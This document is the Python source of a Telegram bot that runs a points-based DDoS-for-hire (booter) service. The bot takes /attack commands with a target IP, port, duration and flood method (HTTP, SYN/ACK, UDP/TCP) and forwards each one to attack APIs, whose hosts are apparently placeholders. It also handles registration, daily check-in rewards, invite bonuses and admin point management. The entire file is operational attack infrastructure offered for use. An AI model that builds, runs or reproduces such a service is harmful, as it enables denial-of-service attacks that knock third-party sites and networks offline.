import logging
import requests
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, Filters, MessageHandler
import configparser
import json
import random
import os
from datetime import datetime, date

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

config = configparser.ConfigParser()
config.read('config.ini')
token = config['telegram']['token']
admin_ids = config['telegram']['admin_ids'].split(',')
invited_users_file = 'invited_users.json'

requests.packages.urllib3.disable_warnings()
headers = {'User-Agent': 'IrukoBot'}

script_dir = os.path.dirname(os.path.abspath(__file__))
blacklist_file_path = os.path.join(script_dir, 'blacklist.json')

icp_block = True
specified_chat_ids = ['-1002228013867']

def attack_handler(update, context):
    user = update.message.from_user
    user_id = str(user.id)
    user_name = user.first_name
    user_username = user.username

    is_member = True
    for chat_id in specified_chat_ids:
        member_info = context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        if member_info.status == 'left':
            is_member = False
            break

    if not is_member:
        button_join_group = InlineKeyboardButton(text="加入群组 | Join the Group", url="https://t.me/BestFreeL7")
        keyboard = [[button_join_group]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.message.chat_id, text="🇺🇸🇬🇧 Please join our group first\n\n🇨🇳 请先加入我们的群组", reply_to_message_id=update.message.message_id, reply_markup=reply_markup)
        return

    user_data = load_user_data()

    if user_id not in user_data:
        context.bot.send_message(chat_id=update.message.chat_id, text="请先注册，发送 /register 命令进行注册", reply_to_message_id=update.message.message_id)
        return

    args = context.args
    if len(args) != 4:
        context.bot.send_message(chat_id=update.message.chat_id, text="""
<b>命令语法</b>
/attack 目标 端口 时间 模式
        """, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)
        return

    target, port, time, method = args
    method = method.lower()

    if not validate_target(target):
        context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️目标格式不合法", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)
        return

    if not time.isdigit():
        context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️时间格式不合法", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)
        return

    if not port.isdigit():
        context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️端口格式不合法", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)
        return

    if user_data[user_id]['points'] < int(time):
        context.bot.send_message(chat_id=update.message.chat_id, text="⚠️您的积分不足", reply_to_message_id=update.message.message_id)
        return

    if is_blacklisted(target):
        context.bot.send_message(chat_id=update.message.chat_id, text="⛔️目标包含黑名单关键词", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)
        return
    if check_icp_status(target):
        context.bot.send_message(chat_id=update.message.chat_id, text="⛔️禁止提交ICP备案目标", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)
        return

    if method in ['https', 'http']:
        url = f"https://bing.com/api.php?host={target}&port={port}&time={time}&method={method}"
    elif method in ['ack', 'syn']:
        url = f"https://baidu.com/api.php?host={target}&port={port}&time={time}&method={method}"
    elif method in ['udp', 'tcp']:
        url = f"https://google.com/api.php?host={target}&port={port}&time={time}&method={method}"
    else:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️不支持的攻击方法: {method}\n发送 /method 查看方法列表", reply_to_message_id=update.message.message_id)
        return

    try:
        response = requests.get(url, verify=False, headers=headers)
        if "成功" in response.text:
            context.bot.send_message(chat_id=update.message.chat_id, text=f"""
🎉<b>任务提交成功</b>
🎯<b>目标</b>(<i>Host</i>): <a href="{target}">{target}</a>
🔌<b>端口</b>(<i>Port</i>): <code>{port}</code>
⏳<b>时间</b>(<i>Time</i>): <code>{time}s</code>
⚙️<b>方法</b>(<i>Method</i>): <code>{method}</code>
⭐<b>积分消耗</b>(<i>Point</i>): <code>{time}</code>
""", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

            user_data[user_id]['points'] -= int(time)
            save_user_data(user_data)
            log_message = f"""
🎉新任务提交
➖➖➖➖➖➖➖➖
🎯目标(Host): <a href="{target}">{target}</a>
🔌端口(Port): <code>{port}</code>
⏳时间(Time): <code>{time}s</code>
⚙️方法(Method): <code>{method}</code>
🆔用户ID: <code>{user_id}</code>
👤用户名称: <a href="https://t.me/{user_username}">{user_name}</a>
➖➖➖➖➖➖➖➖
"""
            for admin_id in admin_ids:
                context.bot.send_message(chat_id=admin_id, text=log_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        else:
            try:
                context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️{response.text}", reply_to_message_id=update.message.message_id)
            except:
                context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️提交失败,请稍后再试", reply_to_message_id=update.message.message_id)
    except requests.exceptions.RequestException as e:
        context.bot.send_message(chat_id=update.message.chat_id, text=f"⚠️提交失败,请稍后再试", reply_to_message_id=update.message.message_id)
        return

def help_handler(update, context):
    help_text = '''
<b>F岁岁ddos机器人</b> 
/attack - 提交任务
/method -方法列表
/my - 用户信息
/checkin - 签到
/invite - 邀请
'''
    context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)

def start_handler(update, context):
    args = context.args
    if not args:
        start_text = '''
欢迎使用
发送 /help 查看帮助
        '''
        context.bot.send_message(chat_id=update.message.chat_id, text=start_text)
    else:
        start_text = '''
欢迎使用
发送 /help 查看帮助
        '''
        context.bot.send_message(chat_id=update.message.chat_id, text=start_text)
        user_id = update.message.from_user.id
        invited_user_id = args[0]

        invited_users = set()
        try:
            with open(invited_users_file, 'r') as file:
                invited_users = set(json.load(file))
        except FileNotFoundError:
            pass

        print(invited_user_id)
        print(user_id)
        if str(user_id) == invited_user_id:
            context.bot.send_message(chat_id=update.message.chat_id, text='您不能邀请自己！')
            return
        
        if user_id not in invited_users:
            invited_users.add(user_id)
            with open(invited_users_file, 'w') as file:
                json.dump(list(invited_users), file)

            user_data = load_user_data()
            user_data[invited_user_id]['points'] += 60
            save_user_data(user_data)
            context.bot.send_message(chat_id=invited_user_id, text='✅您成功邀请一名用户\n⭐获得奖励60积分')

        else:
            context.bot.send_message(chat_id=update.message.chat_id, text='您已经被邀请过了！')

def invite_handler(update, context):
    user_id = update.effective_user.id

    invite_link = f"https://t.me/YourBotName?start={user_id}"

    update.message.reply_text(f"✅<b>已生成专属邀请链接</b>\n❤<b>邀请其它用户可获得积分奖励</b>\n\n🔗<b>{invite_link}</b>", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML)

def method_handler(update, context):
    method_text = '''
<b>⚙️ 当前可用方法 ⚙️</b>
<b>方法名称 - 方法介绍 - 最大攻击时间</b>

<code>xxx</code> - <b>xxx (x秒)</b>
'''
    context.bot.send_message(chat_id=update.message.chat_id, text=method_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)

def register_handler(update, context):
    user = update.message.from_user
    user_id = str(user.id)
    user_name = user.first_name
    user_username = user.username

    is_member = True
    for chat_id in specified_chat_ids:
        member_info = context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        if member_info.status == 'left':
            is_member = False
            break

    if not is_member:
        button_join_group = InlineKeyboardButton(text="加入群组 | Join the Group", url="https://t.me/YourGroupName")
        keyboard = [[button_join_group]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot.send_message(chat_id=update.message.chat_id, text="请加入我们的群组\nPlease join our group", reply_to_message_id=update.message.message_id, reply_markup=reply_markup)
        return
    
    user_data = load_user_data()
    
    if user_id not in user_data:
        today = date.today()
        user_data[user_id] = {
            'points': 0,
            'last_check_in': '1970-1-1'
        }
        
        save_user_data(user_data)
        
        context.bot.send_message(chat_id=update.message.chat_id, text="<b>注册成功</b>\n⭐每日发送 /checkin 签到获取积分", parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)
    else:
        context.bot.send_message(chat_id=update.message.chat_id, text="您已经注册过了", reply_to_message_id=update.message.message_id)

def check_in_handler(update, context):
    user_id = str(update.effective_user.id)
    
    user_data = load_user_data()
    
    if user_id not in user_data:
        context.bot.send_message(chat_id=update.effective_chat.id, text="您还未注册，请发送 /register 命令进行注册", reply_to_message_id=update.message.message_id)
        return
    
    today = date.today()
    last_check_in = datetime.strptime(user_data[user_id]['last_check_in'], "%Y-%m-%d").date()
    
    if last_check_in == today:
        context.bot.send_message(chat_id=update.effective_chat.id, text="您今天已经签到过了", reply_to_message_id=update.message.message_id)
    else:
        points_reward = random.randint(40, 80)
        user_data[user_id]['points'] += points_reward
        user_data[user_id]['last_check_in'] = today.strftime("%Y-%m-%d")
    
        save_user_data(user_data)
    
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>🎉签到成功</b>\n⭐您的积分已增加 {points_reward} 点", parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)

def my_handler(update, context):
    user = update.message.from_user
    user_id = str(user.id)
    user_name = user.first_name
    user_username = user.username
    
    user_data = load_user_data()
    
    if user_id not in user_data:
        context.bot.send_message(chat_id=update.message.chat_id, text="您还未注册，请发送 /register 命令进行注册", reply_to_message_id=update.message.message_id)
        return
    
    points = user_data[user_id]['points']
    
    today = date.today()
    last_check_in = datetime.strptime(user_data[user_id]['last_check_in'], "%Y-%m-%d").date()
    checked_in_today = last_check_in == today
    
    message = f'<b>👋🏻 嗨 <a href="https://t.me/{user_username}">{user_name}</a></b>\n🆔<b>用户ID</b>: <code>{user_id}</code>\n⭐<b>剩余积分</b>: {points}'
    if checked_in_today:
        message += "\n🍃<b>签到状态</b>: 今日已签到"
    else:
        message += "\n🍃<b>签到状态</b>: 今日未签到"
    
    context.bot.send_message(chat_id=update.message.chat_id, text=message, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_to_message_id=update.message.message_id)

def add_points_handler(update, context):
    user = update.message.from_user
    user_id = user.id
    user_name = user.first_name
    user_username = user.username
    if str(user_id) not in admin_ids:
        context.bot.send_message(chat_id=update.message.chat_id, text="抱歉，你没有权限执行该操作", reply_to_message_id=update.message.message_id)
        return
    
    if len(context.args) != 2:
        context.bot.send_message(chat_id=update.message.chat_id, text="使用方法：/add <用户ID> <积分>", reply_to_message_id=update.message.message_id)
        return
    
    user_id = context.args[0]
    points_to_add = int(context.args[1])
    
    user_data = load_user_data()
    
    if user_id not in user_data:
        context.bot.send_message(chat_id=update.message.chat_id, text="用户ID不存在", reply_to_message_id=update.message.message_id)
        return
    
    user_data[user_id]['points'] += points_to_add
    
    save_user_data(user_data)
    
    context.bot.send_message(chat_id=update.message.chat_id, text=f"用户 <code>{user_id}</code> 的积分已增加 {points_to_add}", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


def deduct_points_handler(update, context):
    user = update.message.from_user
    user_id = user.id
    user_name = user.first_name
    user_username = user.username
    if str(user_id) not in admin_ids:
        context.bot.send_message(chat_id=update.message.chat_id, text="抱歉，你没有权限执行该操作", reply_to_message_id=update.message.message_id)
        return
    
    if len(context.args) != 2:
        context.bot.send_message(chat_id=update.message.chat_id, text="使用方法：/dec <用户ID> <积分>", reply_to_message_id=update.message.message_id)
        return
    
    user_id = context.args[0]
    points_to_deduct = int(context.args[1])
    
    user_data = load_user_data()
    
    if user_id not in user_data:
        context.bot.send_message(chat_id=update.message.chat_id, text="用户ID不存在", reply_to_message_id=update.message.message_id)
        return
    
    if user_data[user_id]['points'] < points_to_deduct:
        context.bot.send_message(chat_id=update.message.chat_id, text="用户剩余积分不足", reply_to_message_id=update.message.message_id)
        return
    
    user_data[user_id]['points'] -= points_to_deduct
    
    save_user_data(user_data)
    
    context.bot.send_message(chat_id=update.message.chat_id, text=f"用户 <code>{user_id}</code> 的积分已减少 {points_to_deduct}", reply_to_message_id=update.message.message_id, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

def ban_keyword(update, context):
    user_id = update.message.from_user.id
    
    if str(user_id) not in admin_ids:
        context.bot.send_message(chat_id=update.message.chat_id, text="抱歉，你没有权限执行该操作")
        return
    if len(context.args) != 1:
        context.bot.send_message(chat_id=update.message.chat_id, text="使用方法: /ban <关键词>", reply_to_message_id=update.message.message_id)
        return

    ip = context.args[0]
    with open(blacklist_file_path, 'r') as f:
        blacklist = json.load(f)
    if ip in blacklist:
        context.bot.send_message(chat_id=update.message.chat_id, text="该关键词已经在黑名单中", reply_to_message_id=update.message.message_id)
    else:
        blacklist.append(ip)
        with open(blacklist_file_path, 'w') as f:
            json.dump(blacklist, f, indent=4)
        context.bot.send_message(chat_id=update.message.chat_id, text="关键词已添加到黑名单中", reply_to_message_id=update.message.message_id)

def unban_keyword(update, context):
    user_id = update.message.from_user.id
    
    if str(user_id) not in admin_ids:
        context.bot.send_message(chat_id=update.message.chat_id, text="抱歉，你没有权限执行该操作")
        return
    if len(context.args) != 1:
        context.bot.send_message(chat_id=update.message.chat_id, text="使用方法: /unban <关键词>", reply_to_message_id=update.message.message_id)
        return

    ip = context.args[0]
    with open(blacklist_file_path, 'r') as f:
        blacklist = json.load(f)
    if ip not in blacklist:
        context.bot.send_message(chat_id=update.message.chat_id, text="该关键词不在黑名单中", reply_to_message_id=update.message.message_id)
    else:
        blacklist.remove(ip)
        with open(blacklist_file_path, 'w') as f:
            json.dump(blacklist, f, indent=4)
        context.bot.send_message(chat_id=update.message.chat_id, text="关键词已从黑名单中移除", reply_to_message_id=update.message.message_id)

def load_user_data():
    try:
        with open('user_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_user_data(data):
    with open('user_data.json', 'w') as file:
        json.dump(data, file, indent=4)

def validate_target(target):
    parts = target.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit():
            return False
        num = int(part)
        if num < 0 or num > 255:
            return False
    return True

def is_blacklisted(target):
    with open(blacklist_file_path, 'r') as f:
        blacklist = json.load(f)
    for item in blacklist:
        if item in target:
            return True
    return False

def check_icp_status(target):
    if icp_block:
        try:
            response = requests.get(f"http://www.beian.miit.gov.cn/getVerifyCode?&d={target}", headers=headers)
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            return False
    else:
        return False

def main():
    updater = Updater(token=token, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("attack", attack_handler))
    dp.add_handler(CommandHandler("help", help_handler))
    dp.add_handler(CommandHandler("start", start_handler))
    dp.add_handler(CommandHandler("invite", invite_handler))
    dp.add_handler(CommandHandler("method", method_handler))
    dp.add_handler(CommandHandler("register", register_handler))
    dp.add_handler(CommandHandler("checkin", check_in_handler))
    dp.add_handler(CommandHandler("my", my_handler))
    dp.add_handler(CommandHandler("add", add_points_handler))
    dp.add_handler(CommandHandler("dec", deduct_points_handler))
    dp.add_handler(CommandHandler("ban", ban_keyword))
    dp.add_handler(CommandHandler("unban", unban_keyword))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
